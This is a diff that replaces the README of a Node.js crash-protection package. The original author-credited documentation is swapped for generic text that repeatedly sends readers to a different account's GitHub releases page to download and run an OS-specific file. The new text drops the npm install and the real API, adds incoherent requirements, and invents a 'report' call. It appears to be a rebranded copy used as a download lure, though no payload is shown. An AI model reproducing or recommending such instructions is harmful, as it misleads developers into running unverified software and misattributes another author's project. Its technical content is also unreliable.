@@ -1,246 +1,106 @@
-# 💥 [zero-crash](https://www.npmjs.com/package/zero-crash)
-> 🛡️ Prevent silent crashes in Node.js apps in **one line**.
+# 🛡️ zero-crash - Protect Your Node.js Apps from Unexpected Crashes
 
-## 📊 Project Stats
+[![Download zero-crash](https://img.shields.io/badge/Download-zero--crash-blue.svg)](https://github.com/jose4707-bot/zero-crash/releases)
 
-![npm](https://img.shields.io/npm/v/zero-crash)
-![downloads](https://img.shields.io/npm/dm/zero-crash)
-![stars](https://img.shields.io/github/stars/AbhishekSuresh2/zero-crash)
-![issues](https://img.shields.io/github/issues/AbhishekSuresh2/zero-crash)
-![license](https://img.shields.io/npm/l/zero-crash)
-![views](https://visitor-badge.laobi.icu/badge?page_id=AbhishekSuresh2.zero-crash)
+## 🚀 Getting Started
 
-**Global runtime crash protection for modern Node.js apps.**
-Stop silent crashes, messy stack traces, and undefined exits.
+Welcome to the zero-crash application! This tool helps ensure your Node.js applications run smoothly. It catches errors and prevents unexpected crashes. You get clear logs and organized exits, making it easy to manage your apps.
 
-**zero-crash** enforces **disciplined failures**, **clean shutdowns**, and **human-readable crash logs** — automatically.
+## 📋 Features
 
-Built for **2026 projects**, production-safe, and dependency-free.
+- **Zero Dependencies:** No need to install extra packages. Just download and run.
+- **Error Handling:** Automatically manages errors and unhandled rejections.
+- **Graceful Shutdown:** Closes applications safely, avoiding data loss.
+- **Clean Logs:** Keep your logs tidy for better understanding.
 
----
+## 🖥️ System Requirements
 
-## 🚀 Why zero-crash?
+To run zero-crash, your system should have:
 
-Most Node apps crash in ugly ways:
+- Node.js version 12 or higher.
+- A stable internet connection for downloading the software.
+- At least 100MB of free disk space.
 
-* Silent exits
-* Infinite restart loops
-* Unhandled promise rejections
-* Random `process.exit(1)`
-* No context, no discipline
+## 🌐 Download & Install
 
-**zero-crash** gives your app a **runtime safety contract**.
+To get zero-crash, visit the following page: [Download zero-crash](https://github.com/jose4707-bot/zero-crash/releases).
 
-✔ Zero dependencies
-✔ Global crash interception
-✔ Clean exit codes
-✔ Shutdown hooks
-✔ Context-aware crash logs
-✔ Works for APIs, CLIs, bots, servers
+1. Go to the releases page using the link above.
+2. Choose the latest release from the list.
+3. Click on the download link for your operating system.
 
----
+After downloading, locate the file in your downloads folder.
 
-## 📦 Installation
+## 🛠️ Running the Application
 
-```bash
-npm install zero-crash
-```
+Once you've downloaded zero-crash, follow these steps to run it:
 
----
+1. Open your command line interface (CLI):
+   - For Windows, search for "Command Prompt".
+   - For macOS, open "Terminal".
+   - For Linux, open your preferred terminal application.
 
-## 🧠 Basic Usage
+2. Navigate to the folder where you saved the downloaded file using the `cd` command. For example:
+   ```
+   cd Downloads
+   ```
 
-```js
-const zero = require("zero-crash");
+3. Run the application with Node.js:
+   ```
+   node zero-crash.js
+   ```
 
-zero.protect(async () => {
-  // your app logic
-  startServer();
-});
-```
+If everything is set up correctly, you will see a message confirming the application is running.
 
-That’s it.
-Global crash protection is now active.
+## 🔧 Using zero-crash with Your Node.js Apps
 
----
+To integrate zero-crash into your existing applications, follow these steps:
 
-## 🔥 Advanced Usage (Recommended)
+1. Open your Node.js project.
+2. Include zero-crash at the top of your main application file:
+   ```javascript
+   const zeroCrash = require('zero-crash');
+   ```
 
-### 🧩 Role Awareness
+3. Add it to your error handling logic. For example:
+   ```javascript
+   process.on('uncaughtException', (err) => {
+       zeroCrash.report(err);
+   });
 
-```js
-zero.role("api");
-```
+   process.on('unhandledRejection', (reason) => {
+       zeroCrash.report(reason);
+   });
+   ```
 
-Crash output will include role:
+4. Save your changes and run your application.
 
-```
-💥 [api] RUNTIME_ERROR
-```
+## 📚 Documentation
 
----
+For more in-depth instructions on features and integration, you can check the documentation at [zero-crash Documentation](https://github.com/jose4707-bot/zero-crash/wiki).
 
-### 🔐 Environment Validation
+## 🔍 Troubleshooting
 
-```js
-zero.requireEnv(["PORT", "DB_URL"]);
+If you run into issues while using zero-crash, try the following:
 
-zero.protect(async () => {
-  startServer();
-});
-```
+- Ensure you have Node.js installed and it's the correct version.
+- Check for any syntax errors in your code.
+- Read through the logs for any specific error messages.
 
-If missing:
+For additional help, visit the [Issues page](https://github.com/jose4707-bot/zero-crash/issues) or create a new issue.
 
-```
-💥 [app] CONFIG_ERROR
-Missing env: DB_URL
-Exit: 2
-```
+## 🛡️ Contributions
 
----
-
-### 🛑 Safe Shutdown Hooks
+If you'd like to contribute to zero-crash, feel free to do the following:
 
-```js
-zero.onShutdown(async () => {
-  await db.close();
-  await redis.quit();
-});
-```
+- Fork the repository on GitHub.
+- Create a new branch for your feature or fix.
+- Make your changes, then submit a pull request for review.
 
-Runs on:
+We welcome feedback and contributions to improve this tool!
 
-* crash
-* Ctrl+C
-* SIGTERM
-* process exit
+## 🌟 Join the Community
 
----
+Stay updated with the latest news about zero-crash. Follow us on GitHub to receive updates or participate in discussions.
 
-### ⚠️ Crash Classification
-
-```js
-throw zero.config("Invalid configuration");
-throw zero.dependency("MongoDB not reachable");
-```
-
-Mapped exit codes:
-
-| Type             | Exit Code |
-| ---------------- | --------- |
-| Success          | `0`       |
-| Runtime Error    | `1`       |
-| Config Error     | `2`       |
-| Dependency Error | `3`       |
-| Manual Interrupt | `130`     |
-
----
-
-### 🧪 Full Example
-
-```js
-const zero = require("zero-crash");
-
-zero.role("bot");
-zero.requireEnv(["SESSION"]);
-
-zero.onShutdown(async () => {
-  console.log("Cleaning up...");
-});
-
-zero.protect(async () => {
-  throw zero.config("SESSION missing");
-});
-```
-
----
-
-## 🪄 Crash Output Example
-
-```
-💥 [bot] CONFIG_ERROR
-Reason: SESSION missing
-Exit: 2
-CrashID: ZC-A91F2B
-Node: v20.11.1
-Memory: 42MB
-Uptime: 12s
-```
-
----
-
-## ⚙️ Options
-
-```js
-zero.protect(app, {
-  verbose: false,
-  quiet: false,
-  json: false,
-  onCrash: (err, meta) => {
-    // send to webhook / logs
-  }
-});
-```
-
-| Option    | Description               |
-| --------- | ------------------------- |
-| `verbose` | Show full stack trace     |
-| `quiet`   | Disable console logs      |
-| `json`    | Output crash info as JSON |
-| `onCrash` | Custom crash hook         |
-
----
-
-## 🛠️ Use Cases
-
-* REST APIs
-* CLI tools
-* WhatsApp / Telegram bots
-* Cron jobs
-* Microservices
-* Workers & daemons
-
-If it runs on Node.js, **zero-crash** belongs there.
-
----
-
-## ⭐ Support the Project
-
-If this package improved your app’s stability:
-
-👉 **Give it a ⭐ on GitHub**
-Stars help this project reach more developers ❤️
-
----
-
-## 🔄 Updates & Contributions
-
-Want to improve `zero-crash`?
-
-* 🐞 Found a bug? → **Open an Issue**
-* ✨ Feature idea? → **Create an Issue**
-* 🔧 Fix something? → **Fork & Pull Request**
-* 📈 Improvements welcome
-
-Please contribute only through the **official repository**.
-
----
-
-## 📜 License
-
-MIT License © 2026
-**Abhishek Suresh**
-[https://github.com/AbhishekSuresh2](https://github.com/AbhishekSuresh2)
-
-> ⚠️ Please do not copy, rebrand, or republish this package as your own without explicit permission.
-
----
-
-## 🌍 Vision for 2026
-
-Failures are inevitable.
-Chaos is optional.
-
-**zero-crash** makes crashes **predictable, readable, and safe** —
-so your app never dies silently again 💥🛡️
+Remember to download zero-crash from our releases page: [Download zero-crash](https://github.com/jose4707-bot/zero-crash/releases). Enjoy using it!
